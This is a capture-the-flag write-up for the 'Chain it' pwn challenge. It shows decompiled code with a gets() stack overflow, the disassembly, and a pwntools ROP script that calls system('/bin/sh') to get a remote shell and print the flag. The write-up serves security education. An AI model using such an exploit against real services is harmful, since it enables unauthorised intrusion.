# Cygenix CTF 2024

## Chain it

> *"Where there is code, there is a way in."*
>
>  Author: N/A
>
> [`main`](main)

Tags: _pwn_

## Solution

To analyze the binary of this challenge we put it through `Ghidra`. We can see a very similar setup as for [`classic`](../classic/README.md), but calling `id` will not give us any good result.

```c
void id(void)
{
  system("id");
  return;
}

undefined8 main(void)
{
  char local_28 [32];
  
  puts("----------------------------------------------");
  puts("7h353 71m3 17 15 4 b17 7r1cky...!");
  puts("----------------------------------------------");
  fflush(stdout);
  gets(local_28);
  return 0;
}
```

But one thing we can use from the function is the call to `system`. We only need to prepare the parameter to point to an `/bin/sh` and thankfully we find such a string in the binary as well. So our payload needs to prepare `rdi` with the correct address and then jump to `id+14` (0040116d) to call system.

```c
0040115f  int64_t id()

0040115f  55                 push    rbp {__saved_rbp}
00401160  4889e5             mov     rbp, rsp {__saved_rbp}
00401163  488d059e0e0000     lea     rax, [rel data_402008]
0040116a  4889c7             mov     rdi, rax  {data_402008}
0040116d  e8cefeffff         call    system
00401172  90                 nop     
00401173  5d                 pop     rbp {__saved_rbp}
00401174  c3                 retn     {__return_addr}
```

The following code does exactly this and gives us a shell on the remote container.

```py
from pwn import *

context.binary = binary = ELF("./main")

p = remote("chall.ycfteam.in", 4444)

pop_rdi = 0x40115a
bin_sh  = next(binary.search(b"/bin/sh"))

payload = flat({
    0x28: [
        pop_rdi,
        bin_sh,
        binary.sym.id + 14
    ]
})

p.sendline(payload)
p.interactive()
```

```bash
----------------------------------------------
7h353 71m3 17 15 4 b17 7r1cky...!
----------------------------------------------
$ pwd
/usr/src/app
$ ls
f.txt
flag.txt
main
$ cat flag.txt
CyGenixCTF{d4mm_0nc3_4641n_y0u_c4ll3d_m3_cl4551c_r0p}
```

Flag `CyGenixCTF{d4mm_0nc3_4641n_y0u_c4ll3d_m3_cl4551c_r0p}`